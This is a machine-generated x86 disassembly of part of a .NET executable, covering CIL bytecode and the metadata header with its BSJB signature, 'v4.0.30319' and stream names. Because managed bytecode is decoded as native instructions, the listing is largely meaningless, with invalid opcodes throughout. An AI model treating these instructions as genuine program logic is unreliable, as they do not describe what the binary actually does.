  403be0:	00 00                	add    %al,(%eax)
  403be2:	0a 16                	or     (%esi),%dl
  403be4:	fe 01                	incb   (%ecx)
  403be6:	0d 09 2d 0b 7e       	or     $0x7e0b2d09,%eax
  403beb:	77 00                	ja     0x403bed
  403bed:	00 0a                	add    %cl,(%edx)
  403bef:	0c 38                	or     $0x38,%al
  403bf1:	f5                   	cmc
  403bf2:	00 00                	add    %al,(%eax)
  403bf4:	00 02                	add    %al,(%edx)
  403bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf7:	6e                   	outsb  %ds:(%esi),(%dx)
  403bf8:	00 00                	add    %al,(%eax)
  403bfa:	0a 1f                	or     (%edi),%bl
  403bfc:	10 58 73             	adc    %bl,0x73(%eax)
  403bff:	2b 00                	sub    (%eax),%eax
  403c01:	00 0a                	add    %cl,(%edx)
  403c03:	0a 00                	or     (%eax),%al
  403c05:	02 13                	add    (%ebx),%dl
  403c07:	04 16                	add    $0x16,%al
  403c09:	13 05 38 bf 00 00    	adc    0xbf38,%eax
  403c0f:	00 11                	add    %dl,(%ecx)
  403c11:	04 11                	add    $0x11,%al
  403c13:	05 6f 59 00 00       	add    $0x596f,%eax
  403c18:	0a 0b                	or     (%ebx),%cl
  403c1a:	00 07                	add    %al,(%edi)
  403c1c:	13 06                	adc    (%esi),%eax
  403c1e:	11 06                	adc    %eax,(%esi)
  403c20:	1f                   	pop    %ds
  403c21:	09 59 45             	or     %ebx,0x45(%ecx)
  403c24:	05 00 00 00 46       	add    $0x46000000,%eax
  403c29:	00 00                	add    %al,(%eax)
  403c2b:	00 2a                	add    %ch,(%edx)
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  403c33:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  403c37:	00 38                	add    %bh,(%eax)
  403c39:	00 00                	add    %al,(%eax)
  403c3b:	00 11                	add    %dl,(%ecx)
  403c3d:	06                   	push   %es
  403c3e:	1f                   	pop    %ds
  403c3f:	22 2e                	and    (%esi),%ch
  403c41:	16                   	push   %ss
  403c42:	11 06                	adc    %eax,(%esi)
  403c44:	1f                   	pop    %ds
  403c45:	5c                   	pop    %esp
  403c46:	2e 02 2b             	add    %cs:(%ebx),%ch
  403c49:	46                   	inc    %esi
  403c4a:	06                   	push   %es
  403c4b:	72 ef                	jb     0x403c3c
  403c4d:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403c52:	00 00                	add    %al,(%eax)
  403c54:	0a 26                	or     (%esi),%ah
  403c56:	2b 70 06             	sub    0x6(%eax),%esi
  403c59:	72 f5                	jb     0x403c50
  403c5b:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403c60:	00 00                	add    %al,(%eax)
  403c62:	0a 26                	or     (%esi),%ah
  403c64:	2b 62 06             	sub    0x6(%edx),%esp
  403c67:	72 fb                	jb     0x403c64
  403c69:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 26                	or     (%esi),%ah
  403c72:	2b 54 06 72          	sub    0x72(%esi,%eax,1),%edx
  403c76:	01 06                	add    %eax,(%esi)
  403c78:	00 70 6f             	add    %dh,0x6f(%eax)
  403c7b:	5a                   	pop    %edx
  403c7c:	00 00                	add    %al,(%eax)
  403c7e:	0a 26                	or     (%esi),%ah
  403c80:	2b 46 06             	sub    0x6(%esi),%eax
  403c83:	72 07                	jb     0x403c8c
  403c85:	06                   	push   %es
  403c86:	00 70 6f             	add    %dh,0x6f(%eax)
  403c89:	5a                   	pop    %edx
  403c8a:	00 00                	add    %al,(%eax)
  403c8c:	0a 26                	or     (%esi),%ah
  403c8e:	2b 38                	sub    (%eax),%edi
  403c90:	07                   	pop    %es
  403c91:	1f                   	pop    %ds
  403c92:	20 fe                	and    %bh,%dh
  403c94:	04 16                	add    $0x16,%al
  403c96:	fe 01                	incb   (%ecx)
  403c98:	0d 09 2d 22 06       	or     $0x6222d09,%eax
  403c9d:	72 0d                	jb     0x403cac
  403c9f:	06                   	push   %es
  403ca0:	00 70 6f             	add    %dh,0x6f(%eax)
  403ca3:	5a                   	pop    %edx
  403ca4:	00 00                	add    %al,(%eax)
  403ca6:	0a 07                	or     (%edi),%al
  403ca8:	13 07                	adc    (%edi),%eax
  403caa:	12 07                	adc    (%edi),%al
  403cac:	72 13                	jb     0x403cc1
  403cae:	06                   	push   %es
  403caf:	00 70 28             	add    %dh,0x28(%eax)
  403cb2:	78 00                	js     0x403cb4
  403cb4:	00 0a                	add    %cl,(%edx)
  403cb6:	6f                   	outsl  %ds:(%esi),(%dx)
  403cb7:	5a                   	pop    %edx
  403cb8:	00 00                	add    %al,(%eax)
  403cba:	0a 26                	or     (%esi),%ah
  403cbc:	2b 08                	sub    (%eax),%ecx
  403cbe:	06                   	push   %es
  403cbf:	07                   	pop    %es
  403cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc1:	72 00                	jb     0x403cc3
  403cc3:	00 0a                	add    %cl,(%edx)
  403cc5:	26 2b 00             	sub    %es:(%eax),%eax
  403cc8:	00 11                	add    %dl,(%ecx)
  403cca:	05 17 58 13 05       	add    $0x5135817,%eax
  403ccf:	11 05 11 04 6f 6e    	adc    %eax,0x6e6f0411
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	0a fe                	or     %dh,%bh
  403cd9:	04 0d                	add    $0xd,%al
  403cdb:	09 3a                	or     %edi,(%edx)
  403cdd:	2f                   	das
  403cde:	ff                   	(bad)
  403cdf:	ff                   	(bad)
  403ce0:	ff 06                	incl   (%esi)
  403ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce3:	2d 00 00 0a 0c       	sub    $0xc0a0000,%eax
  403ce8:	2b 00                	sub    (%eax),%eax
  403cea:	08 2a                	or     %ch,(%edx)
  403cec:	03 30                	add    (%eax),%esi
  403cee:	01 00                	add    %eax,(%eax)
  403cf0:	8d 00                	lea    (%eax),%eax
  403cf2:	00 00                	add    %al,(%eax)
  403cf4:	00 00                	add    %al,(%eax)
  403cf6:	00 00                	add    %al,(%eax)
  403cf8:	17                   	pop    %ss
  403cf9:	fe                   	(bad)
  403cfa:	13 80 01 00 00 04    	adc    0x4000001(%eax),%eax
  403d00:	73 2a                	jae    0x403d2c
  403d02:	00 00                	add    %al,(%eax)
  403d04:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  403d0a:	72 19                	jb     0x403d25
  403d0c:	06                   	push   %es
  403d0d:	00 70 80             	add    %dh,-0x80(%eax)
  403d10:	03 00                	add    (%eax),%eax
  403d12:	00 04 20             	add    %al,(%eax,%eiz,1)
  403d15:	0c 17                	or     $0x17,%al
  403d17:	00 00                	add    %al,(%eax)
  403d19:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  403d1d:	04 1f                	add    $0x1f,%al
  403d1f:	0a 80 05 00 00 04    	or     0x4000005(%eax),%al
  403d25:	1f                   	pop    %ds
  403d26:	46                   	inc    %esi
  403d27:	6a 80                	push   $0xffffff80
  403d29:	06                   	push   %es
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	04 7e                	add    $0x7e,%al
  403d2e:	13 00                	adc    (%eax),%eax
  403d30:	00 0a                	add    %cl,(%edx)
  403d32:	80 07 00             	addb   $0x0,(%edi)
  403d35:	00 04 7e             	add    %al,(%esi,%edi,2)
  403d38:	13 00                	adc    (%eax),%eax
  403d3a:	00 0a                	add    %cl,(%edx)
  403d3c:	80 08 00             	orb    $0x0,(%eax)
  403d3f:	00 04 72             	add    %al,(%edx,%esi,2)
  403d42:	5b                   	pop    %ebx
  403d43:	01 00                	add    %eax,(%eax)
  403d45:	70 80                	jo     0x403cc7
  403d47:	0a 00                	or     (%eax),%al
  403d49:	00 04 16             	add    %al,(%esi,%edx,1)
  403d4c:	8d 40 00             	lea    0x0(%eax),%eax
  403d4f:	00 01                	add    %al,(%ecx)
  403d51:	80 0b 00             	orb    $0x0,(%ebx)
  403d54:	00 04 16             	add    %al,(%esi,%edx,1)
  403d57:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403d5b:	04 16                	add    $0x16,%al
  403d5d:	80 0d 00 00 04 23 00 	orb    $0x0,0x23040000
  403d64:	00 00                	add    %al,(%eax)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 00                	add    %al,(%eax)
  403d6a:	00 80 0e 00 00 04    	add    %al,0x400000e(%eax)
  403d70:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403d73:	00 06                	add    %al,(%esi)
  403d75:	80 0f 00             	orb    $0x0,(%edi)
  403d78:	00 04 72             	add    %al,(%edx,%esi,2)
  403d7b:	2f                   	das
  403d7c:	06                   	push   %es
  403d7d:	00 70 80             	add    %dh,-0x80(%eax)
  403d80:	10 00                	adc    %al,(%eax)
  403d82:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403d85:	1e                   	push   %ds
  403d86:	02 28                	add    (%eax),%ch
  403d88:	2a 00                	sub    (%eax),%al
  403d8a:	00 0a                	add    %cl,(%edx)
  403d8c:	2a 00                	sub    (%eax),%al
  403d8e:	00 00                	add    %al,(%eax)
  403d90:	42                   	inc    %edx
  403d91:	53                   	push   %ebx
  403d92:	4a                   	dec    %edx
  403d93:	42                   	inc    %edx
  403d94:	01 00                	add    %eax,(%eax)
  403d96:	01 00                	add    %eax,(%eax)
  403d98:	00 00                	add    %al,(%eax)
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	0c 00                	or     $0x0,%al
  403d9e:	00 00                	add    %al,(%eax)
  403da0:	76 34                	jbe    0x403dd6
  403da2:	2e 30 2e             	xor    %ch,%cs:(%esi)
  403da5:	33 30                	xor    (%eax),%esi
  403da7:	33 31                	xor    (%ecx),%esi
  403da9:	39 00                	cmp    %eax,(%eax)
  403dab:	00 00                	add    %al,(%eax)
  403dad:	00 05 00 6c 00 00    	add    %al,0x6c00
  403db3:	00 cc                	add    %cl,%ah
  403db5:	0b 00                	or     (%eax),%eax
  403db7:	00 23                	add    %ah,(%ebx)
  403db9:	7e 00                	jle    0x403dbb
  403dbb:	00 38                	add    %bh,(%eax)
  403dbd:	0c 00                	or     $0x0,%al
  403dbf:	00 d8                	add    %bl,%al
  403dc1:	0d 00 00 23 53       	or     $0x53230000,%eax
  403dc6:	74 72                	je     0x403e3a
  403dc8:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  403dcf:	00 10                	add    %dl,(%eax)
  403dd1:	1a 00                	sbb    (%eax),%al
  403dd3:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  403dd7:	00 23                	add    %ah,(%ebx)
  403dd9:	55                   	push   %ebp
  403dda:	53                   	push   %ebx
  403ddb:	00 7c 3d 00          	add    %bh,0x0(%ebp,%edi,1)
  403ddf:	00 10                	add    %dl,(%eax)
  403de1:	00 00                	add    %al,(%eax)
  403de3:	00 23                	add    %ah,(%ebx)
  403de5:	47                   	inc    %edi
  403de6:	55                   	push   %ebp
  403de7:	49                   	dec    %ecx
  403de8:	44                   	inc    %esp
  403de9:	00 00                	add    %al,(%eax)
  403deb:	00 8c 3d 00 00 54 04 	add    %cl,0x4540000(%ebp,%edi,1)
  403df2:	00 00                	add    %al,(%eax)
  403df4:	23 42 6c             	and    0x6c(%edx),%eax
  403df7:	6f                   	outsl  %ds:(%esi),(%dx)
  403df8:	62 00                	bound  %eax,(%eax)
  403dfa:	00 00                	add    %al,(%eax)
  403dfc:	00 00                	add    %al,(%eax)
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	02 00                	add    (%eax),%al
  403e02:	00 01                	add    %al,(%ecx)
  403e04:	57                   	push   %edi
  403e05:	3d 02 1c 09 02       	cmp    $0x2091c02,%eax
  403e0a:	00 00                	add    %al,(%eax)
  403e0c:	00 fa                	add    %bh,%dl
  403e0e:	25 33 00 16 00       	and    $0x160033,%eax
  403e13:	00 01                	add    %al,(%ecx)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	00 43 00             	add    %al,0x0(%ebx)
  403e1a:	00 00                	add    %al,(%eax)
  403e1c:	0a 00                	or     (%eax),%al
  403e1e:	00 00                	add    %al,(%eax)
  403e20:	32 00                	xor    (%eax),%al
  403e22:	00 00                	add    %al,(%eax)
  403e24:	26 00 00             	add    %al,%es:(%eax)
  403e27:	00 3e                	add    %bh,(%esi)
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	00 7a 00             	add    %bh,0x0(%edx)
  403e2e:	00 00                	add    %al,(%eax)
  403e30:	15 00 00 00 08       	adc    $0x8000000,%eax
  403e35:	00 00                	add    %al,(%eax)
  403e37:	00 08                	add    %cl,(%eax)
  403e39:	00 00                	add    %al,(%eax)
  403e3b:	00 11                	add    %dl,(%ecx)
  403e3d:	00 00                	add    %al,(%eax)
  403e3f:	00 01                	add    %al,(%ecx)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	00 03                	add    %al,(%ebx)
  403e45:	00 00                	add    %al,(%eax)
  403e47:	00 0a                	add    %cl,(%edx)
  403e49:	00 00                	add    %al,(%eax)
  403e4b:	00 01                	add    %al,(%ecx)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 03                	add    %al,(%ebx)
  403e51:	00 00                	add    %al,(%eax)
  403e53:	00 07                	add    %al,(%edi)
  403e55:	00 00                	add    %al,(%eax)
  403e57:	00 00                	add    %al,(%eax)
  403e59:	00 0a                	add    %cl,(%edx)
  403e5b:	00 01                	add    %al,(%ecx)
  403e5d:	00 00                	add    %al,(%eax)
  403e5f:	00 00                	add    %al,(%eax)
  403e61:	00 06                	add    %al,(%esi)
  403e63:	00 59 00             	add    %bl,0x0(%ecx)
  403e66:	52                   	push   %edx
  403e67:	00 06                	add    %al,(%esi)
  403e69:	00 60 00             	add    %ah,0x0(%eax)
  403e6c:	52                   	push   %edx
  403e6d:	00 06                	add    %al,(%esi)
  403e6f:	00 6a 00             	add    %ch,0x0(%edx)
  403e72:	52                   	push   %edx
  403e73:	00 06                	add    %al,(%esi)
  403e75:	00 9c 00 7c 00 0a 00 	add    %bl,0xa007c(%eax,%eax,1)
  403e7c:	64 01 4d 01          	add    %ecx,%fs:0x1(%ebp)
  403e80:	0e                   	push   %cs
  403e81:	00 ce                	add    %cl,%dh
  403e83:	01 c3                	add    %eax,%ebx
  403e85:	01 0a                	add    %ecx,(%edx)
  403e87:	00 23                	add    %ah,(%ebx)
  403e89:	02 3e                	add    (%esi),%bh
  403e8b:	01 06                	add    %eax,(%esi)
  403e8d:	00 47 04             	add    %al,0x4(%edi)
  403e90:	3b 04 06             	cmp    (%esi,%eax,1),%eax
  403e93:	00 98 04 52 00 06    	add    %bl,0x6005204(%eax)
  403e99:	00 a5 04 52 00 06    	add    %ah,0x6005204(%ebp)
  403e9f:	00 42 05             	add    %al,0x5(%edx)
  403ea2:	23 05 06 00 55 05    	and    0x5550006,%eax
  403ea8:	23 05 06 00 84 05    	and    0x5840006,%eax
  403eae:	23 05 06 00 e0 05    	and    0x5e00006,%eax
  403eb4:	7c 00                	jl     0x403eb6
  403eb6:	06                   	push   %es
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	06                   	push   %es
  403eba:	7c 00                	jl     0x403ebc
  403ebc:	06                   	push   %es
  403ebd:	00 23                	add    %ah,(%ebx)
  403ebf:	06                   	push   %es
  403ec0:	52                   	push   %edx
  403ec1:	00 06                	add    %al,(%esi)
  403ec3:	00 4e 06             	add    %cl,0x6(%esi)
  403ec6:	52                   	push   %edx
  403ec7:	00 06                	add    %al,(%esi)
  403ec9:	00 8f 06 7c 00 06    	add    %cl,0x6007c06(%edi)
  403ecf:	00 b5 06 52 00 06    	add    %dh,0x6005206(%ebp)
  403ed5:	00 da                	add    %bl,%dl
  403ed7:	06                   	push   %es
  403ed8:	52                   	push   %edx
  403ed9:	00 06                	add    %al,(%esi)
  403edb:	00 e0                	add    %ah,%al
  403edd:	06                   	push   %es
  403ede:	52                   	push   %edx
  403edf:	00 06                	add    %al,(%esi)
  403ee1:	00 f7                	add    %dh,%bh
  403ee3:	06                   	push   %es
  403ee4:	e6 06                	out    %al,$0x6
  403ee6:	06                   	push   %es
  403ee7:	00 03                	add    %al,(%ebx)
  403ee9:	07                   	pop    %es
  403eea:	e6 06                	out    %al,$0x6
  403eec:	06                   	push   %es
  403eed:	00 2f                	add    %ch,(%edi)
  403eef:	07                   	pop    %es
  403ef0:	52                   	push   %edx
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	00 4b 07             	add    %cl,0x7(%ebx)
  403ef6:	52                   	push   %edx
  403ef7:	00 06                	add    %al,(%esi)
  403ef9:	00 57 07             	add    %dl,0x7(%edi)
  403efc:	23 05 06 00 71 07    	and    0x7710006,%eax
  403f02:	52                   	push   %edx
  403f03:	00 06                	add    %al,(%esi)
  403f05:	00 8e 07 52 00 06    	add    %cl,0x6005207(%esi)
  403f0b:	00 b7 07 e6 06 0a    	add    %dh,0xa06e607(%edi)
  403f11:	00 d0                	add    %dl,%al
  403f13:	07                   	pop    %es
  403f14:	3e 01 0a             	add    %ecx,%ds:(%edx)
  403f17:	00 f3                	add    %dh,%bl
  403f19:	07                   	pop    %es
  403f1a:	4d                   	dec    %ebp
  403f1b:	01 0a                	add    %ecx,(%edx)
  403f1d:	00 ff                	add    %bh,%bh
  403f1f:	07                   	pop    %es
  403f20:	3e 01 06             	add    %eax,%ds:(%esi)
  403f23:	00 24 08             	add    %ah,(%eax,%ecx,1)
  403f26:	52                   	push   %edx
  403f27:	00 06                	add    %al,(%esi)
  403f29:	00 30                	add    %dh,(%eax)
  403f2b:	08 52 00             	or     %dl,0x0(%edx)
  403f2e:	06                   	push   %es
  403f2f:	00 39                	add    %bh,(%ecx)
  403f31:	08 52 00             	or     %dl,0x0(%edx)
  403f34:	06                   	push   %es
  403f35:	00 92 08 77 08 93    	add    %dl,-0x6cf788f8(%edx)
  403f3b:	00 d1                	add    %dl,%cl
  403f3d:	08 00                	or     %al,(%eax)
  403f3f:	00 0e                	add    %cl,(%esi)
  403f41:	00 2d 09 c3 01 0e    	add    %ch,0xe01c309
  403f47:	00 3a                	add    %bh,(%edx)
  403f49:	09 c3                	or     %eax,%ebx
  403f4b:	01 06                	add    %eax,(%esi)
  403f4d:	00 6f 09             	add    %ch,0x9(%edi)
  403f50:	e6 06                	out    %al,$0x6
  403f52:	06                   	push   %es
  403f53:	00 7c 09 e6          	add    %bh,-0x1a(%ecx,%ecx,1)
  403f57:	06                   	push   %es
  403f58:	0e                   	push   %cs
  403f59:	00 9f 09 c3 01 06    	add    %bl,0x601c309(%edi)
  403f5f:	00 b5 09 52 00 0e    	add    %dh,0xe005209(%ebp)
  403f65:	00 cd                	add    %cl,%ch
  403f67:	09 c3                	or     %eax,%ebx
  403f69:	01 0e                	add    %ecx,(%esi)
  403f6b:	00 ed                	add    %ch,%ch
  403f6d:	09 52 00             	or     %edx,0x0(%edx)
  403f70:	06                   	push   %es
  403f71:	00 19                	add    %bl,(%ecx)
  403f73:	0a 3b                	or     (%ebx),%bh
  403f75:	04 0e                	add    $0xe,%al
  403f77:	00 34 0a             	add    %dh,(%edx,%ecx,1)
  403f7a:	c3                   	ret
  403f7b:	01 06                	add    %eax,(%esi)
  403f7d:	00 93 0a 89 0a 06    	add    %dl,0x60a890a(%ebx)
  403f83:	00 d5                	add    %dl,%ch
  403f85:	0a 89 0a 06 00 e2    	or     -0x1dfff9f6(%ecx),%cl
  403f8b:	0a 89 0a 0e 00 07    	or     0x7000e0a(%ecx),%cl
  403f91:	0b c3                	or     %ebx,%eax
  403f93:	01 0e                	add    %ecx,(%esi)
  403f95:	00 46 0b             	add    %al,0xb(%esi)
  403f98:	27                   	daa
  403f99:	0b 06                	or     (%esi),%eax
  403f9b:	00 d7                	add    %dl,%bh
  403f9d:	0b 77 08             	or     0x8(%edi),%esi
  403fa0:	06                   	push   %es
  403fa1:	00 56 0c             	add    %dl,0xc(%esi)
  403fa4:	41                   	inc    %ecx
  403fa5:	0c 06                	or     $0x6,%al
  403fa7:	00 77 0c             	add    %dh,0xc(%edi)
  403faa:	52                   	push   %edx
  403fab:	00 06                	add    %al,(%esi)
  403fad:	00 7e 0c             	add    %bh,0xc(%esi)
  403fb0:	52                   	push   %edx
  403fb1:	00 06                	add    %al,(%esi)
  403fb3:	00 a1 0c 89 0a 0a    	add    %ah,0xa0a890c(%ecx)
  403fb9:	00 ae 0c 4d 01 0a    	add    %ch,0xa014d0c(%esi)
  403fbf:	00 c0                	add    %al,%al
  403fc1:	0c 4d                	or     $0x4d,%al
  403fc3:	01 0a                	add    %ecx,(%edx)
  403fc5:	00 db                	add    %bl,%bl
  403fc7:	0c 4d                	or     $0x4d,%al
  403fc9:	01 06                	add    %eax,(%esi)
  403fcb:	00 16                	add    %dl,(%esi)
  403fcd:	0d 52 00 06 00       	or     $0x60052,%eax
  403fd2:	41                   	inc    %ecx
  403fd3:	0d 52 00 06 00       	or     $0x60052,%eax
  403fd8:	65 0d 41 0c 06 00    	gs or  $0x60c41,%eax
  403fde:	85 0d 52 00 06 00    	test   %ecx,0x60052
  403fe4:	8a 0d 23 05 06 00    	mov    0x60523,%cl
  403fea:	b5 0d                	mov    $0xd,%ch
  403fec:	23 05 06 00 cb 0d    	and    0xdcb0006,%eax
  403ff2:	23 05 00 00 00 00    	and    0x0,%eax
  403ff8:	01 00                	add    %eax,(%eax)
  403ffa:	00 00                	add    %al,(%eax)
  403ffc:	00 00                	add    %al,(%eax)
  403ffe:	01 00                	add    %eax,(%eax)
  404000:	01 00                	add    %eax,(%eax)
  404002:	80 01 10             	addb   $0x10,(%ecx)
  404005:	00 13                	add    %dl,(%ebx)
  404007:	00 00                	add    %al,(%eax)
  404009:	00 05 00 01 00 01    	add    %al,0x1000100
  40400f:	00 03                	add    %al,(%ebx)
  404011:	01 10                	add    %edx,(%eax)
  404013:	00 1b                	add    %bl,(%ebx)
  404015:	00 00                	add    %al,(%eax)
  404017:	00 05 00 12 00 12    	add    %al,0x12001200
  40401d:	00 83 01 10 00 26    	add    %al,0x26001001(%ebx)
  404023:	00 00                	add    %al,(%eax)
  404025:	00 05 00 16 00 13    	add    %al,0x13001600
  40402b:	00 0a                	add    %cl,(%edx)
  40402d:	01 10                	add    %edx,(%eax)
  40402f:	00 2d 00 00 00 09    	add    %ch,0x9000000
  404035:	00 2b                	add    %ch,(%ebx)
  404037:	00 1d 00 02 01 00    	add    %bl,0x10200
  40403d:	00 32                	add    %dh,(%edx)
  40403f:	00 00                	add    %al,(%eax)
  404041:	00 0d 00 2f 00 1d    	add    %cl,0x1d002f00
  404047:	00 03                	add    %al,(%ebx)
  404049:	01 10                	add    %edx,(%eax)
  40404b:	00 64 08 00          	add    %ah,0x0(%eax,%ecx,1)
  40404f:	00 05 00 2f 00 21    	add    %al,0x21002f00
  404055:	00 03                	add    %al,(%ebx)
  404057:	01 10                	add    %edx,(%eax)
  404059:	00 ff                	add    %bh,%bh
  40405b:	08 00                	or     %al,(%eax)
  40405d:	00 05 00 30 00 23    	add    %al,0x23003000
  404063:	00 00                	add    %al,(%eax)
  404065:	00 00                	add    %al,(%eax)
  404067:	00 92 0b 00 00 05    	add    %dl,0x500000b(%edx)
  40406d:	00 31                	add    %dh,(%ecx)
  40406f:	00 25 00 03 01 10    	add    %ah,0x10010300
  404075:	00 0e                	add    %cl,(%esi)
  404077:	0c 00                	or     $0x0,%al
  404079:	00 05 00 32 00 25    	add    %al,0x25003200
  40407f:	00 11                	add    %dl,(%ecx)
  404081:	00 a7 00 0a 00 31    	add    %ah,0x31000a00(%edi)
  404087:	00 b0 00 0f 00 11    	add    %dh,0x11000f00(%eax)
  40408d:	00 bb 00 12 00 11    	add    %bh,0x11001200(%ebx)
  404093:	00 c8                	add    %cl,%al
  404095:	00 15 00 11 00 ce    	add    %dl,0xce001100
  40409b:	00 15 00 11 00 d3    	add    %dl,0xd3001100
  4040a1:	00 18                	add    %bl,(%eax)
  4040a3:	00 11                	add    %dl,(%ecx)
  4040a5:	00 e0                	add    %ah,%al
  4040a7:	00 1b                	add    %bl,(%ebx)
  4040a9:	00 11                	add    %dl,(%ecx)
  4040ab:	00 e9                	add    %ch,%cl
  4040ad:	00 1b                	add    %bl,(%ebx)
  4040af:	00 11                	add    %dl,(%ecx)
  4040b1:	00 f5                	add    %dh,%ch
  4040b3:	00 1e                	add    %bl,(%esi)
  4040b5:	00 11                	add    %dl,(%ecx)
  4040b7:	00 01                	add    %al,(%ecx)
  4040b9:	01 12                	add    %edx,(%edx)
  4040bb:	00 11                	add    %dl,(%ecx)
  4040bd:	00 0e                	add    %cl,(%esi)
  4040bf:	01 22                	add    %esp,(%edx)
  4040c1:	00 11                	add    %dl,(%ecx)
  4040c3:	00 1a                	add    %bl,(%edx)
  4040c5:	01 15 00 11 00 26    	add    %edx,0x26001100
  4040cb:	01 15 00 11 00 33    	add    %edx,0x33001100
  4040d1:	01 26                	add    %esp,(%esi)
  4040d3:	00 31                	add    %dh,(%ecx)
  4040d5:	00 73 01             	add    %dh,0x1(%ebx)
  4040d8:	32 00                	xor    (%eax),%al
  4040da:	31 00                	xor    %eax,(%eax)
  4040dc:	7e 01                	jle    0x4040df
  4040de:	12 00                	adc    (%eax),%al
  4040e0:	11 00                	adc    %eax,(%eax)
  4040e2:	68 06 31 01 06       	push   $0x6013106
  4040e7:	00 67 02             	add    %ah,0x2(%edi)
  4040ea:	1b 00                	sbb    (%eax),%eax
  4040ec:	06                   	push   %es
  4040ed:	00 6c 02 1e          	add    %ch,0x1e(%edx,%eax,1)
  4040f1:	00 06                	add    %al,(%esi)
  4040f3:	00 71 02             	add    %dh,0x2(%ecx)
  4040f6:	12 00                	adc    (%eax),%al
  4040f8:	06                   	push   %es
  4040f9:	00 77 02             	add    %dh,0x2(%edi)
  4040fc:	15 00 56 80 82       	adc    $0x82805600,%eax
  404101:	02 15 00 56 80 96    	add    0x96805600,%dl
  404107:	02 15 00 56 80 ab    	add    0xab805600,%dl
  40410d:	02 15 00 56 80 be    	add    0xbe805600,%dl
  404113:	02 15 00 56 80 d2    	add    0xd2805600,%dl
  404119:	02 15 00 56 80 e8    	add    0xe8805600,%dl
  40411f:	02 15 00 56 80 00    	add    0x805600,%dl
  404125:	03 15 00 56 80 12    	add    0x12805600,%edx
  40412b:	03 15 00 56 80 27    	add    0x27805600,%edx
  404131:	03 15 00 56 80 3d    	add    0x3d805600,%edx
  404137:	03 15 00 56 80 4a    	add    0x4a805600,%edx
  40413d:	03 15 00 56 80 59    	add    0x59805600,%edx
  404143:	03 15 00 56 80 66    	add    0x66805600,%edx
  404149:	03 15 00 56 80 75    	add    0x75805600,%edx
  40414f:	03 15 00 56 80 82    	add    0x82805600,%edx
  404155:	03 15 00 56 80 90    	add    0x90805600,%edx
  40415b:	03 15 00 56 80 9b    	add    0x9b805600,%edx
  404161:	03 15 00 56 80 a4    	add    0xa4805600,%edx
  404167:	03 15 00 56 80 ac    	add    0xac805600,%edx
  40416d:	03 15 00 56 80 b7    	add    0xb7805600,%edx
  404173:	03 15 00 56 80 c2    	add    0xc2805600,%edx
  404179:	03 15 00 06 00 7b    	add    0x7b000600,%edx
  40417f:	04 15                	add    $0x15,%al
  404181:	00 06                	add    %al,(%esi)
  404183:	00 80 04 15 00 06    	add    %al,0x6001504(%eax)
  404189:	00 84 04 15 00 06 00 	add    %al,0x60015(%esp,%eax,1)
  404190:	8a 04 15 00 06 00 99 	mov    -0x66fffa00(,%edx,1),%al
  404197:	08 f1                	or     %dh,%cl
  404199:	01 06                	add    %eax,(%esi)
  40419b:	00 ce                	add    %cl,%dh
  40419d:	04 44                	add    $0x44,%al
  40419f:	02 13                	add    (%ebx),%dl
  4041a1:	00 e4                	add    %ah,%ah
  4041a3:	0b ee                	or     %esi,%ebp
  4041a5:	02 06                	add    (%esi),%al
  4041a7:	00 99 08 f1 01 64    	add    %bl,0x6401f108(%ecx)
  4041ad:	20 00                	and    %al,(%eax)
  4041af:	00 00                	add    %al,(%eax)
  4041b1:	00 91 00 89 01 36    	add    %dl,0x36018900(%ecx)
  4041b7:	00 01                	add    %al,(%ecx)
  4041b9:	00 4c 21 00          	add    %cl,0x0(%ecx,%eiz,1)
  4041bd:	00 00                	add    %al,(%eax)
  4041bf:	00 91 00 8e 01 36    	add    %dl,0x36018e00(%ecx)
  4041c5:	00 02                	add    %al,(%edx)
  4041c7:	00 98 22 00 00 00    	add    %bl,0x22(%eax)
  4041cd:	00 91 00 98 01 3c    	add    %dl,0x3c019800(%ecx)
  4041d3:	00 03                	add    %al,(%ebx)
  4041d5:	00 00                	add    %al,(%eax)
  4041d7:	28 00                	sub    %al,(%eax)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	00 91 00 a4 01 3c    	add    %dl,0x3c01a400(%ecx)
  4041e1:	00 03                	add    %al,(%ebx)
  4041e3:	00 64 29 00          	add    %ah,0x0(%ecx,%ebp,1)
  4041e7:	00 00                	add    %al,(%eax)
  4041e9:	00 91 00 b5 01 3c    	add    %dl,0x3c01b500(%ecx)
  4041ef:	00 03                	add    %al,(%ebx)
  4041f1:	00 20                	add    %ah,(%eax)
  4041f3:	2a 00                	sub    (%eax),%al
  4041f5:	00 00                	add    %al,(%eax)
  4041f7:	00 91 00 e2 01 40    	add    %dl,0x4001e200(%ecx)
  4041fd:	00 03                	add    %al,(%ebx)
  4041ff:	00 58 2d             	add    %bl,0x2d(%eax)
  404202:	00 00                	add    %al,(%eax)
  404204:	00 00                	add    %al,(%eax)
  404206:	91                   	xchg   %eax,%ecx
  404207:	00 f0                	add    %dh,%al
  404209:	01 40 00             	add    %eax,0x0(%eax)
  40420c:	04 00                	add    $0x0,%al
